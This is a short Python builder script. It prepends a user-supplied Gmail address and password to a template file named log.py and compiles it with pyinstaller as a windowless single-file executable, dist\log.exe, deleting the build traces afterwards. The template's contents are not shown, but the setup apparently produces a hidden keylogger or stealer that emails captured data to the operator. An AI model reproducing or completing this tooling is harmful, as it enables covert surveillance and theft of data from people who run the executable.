import os
from sys import exit

os.system('cls')
print('To send an email you must have less secure apps enabled in your account \nhttps://myaccount.google.com/lesssecureapps')
print('\n')
os.system('copy Template\log.py .\log.py >nul')
email = input('Enter your email: ')
passd =  input('Enter your password: ')

f = open('log.py','r+')
readcontent = f.read()
f.seek(0, 0)
f.write('FRM = ' + "'" + email + "'" + '\n' + 'PAS = ' + "'" + passd + "'" + '\n' + readcontent)
f.close()
os.system('pyinstaller --noconsole --onefile -F log.py')
os.system('rmdir /S /Q build __pycache__')
os.system('del log.py log.spec')
os.system('cls')
print('Saved in dist\log.exe')
exit(0)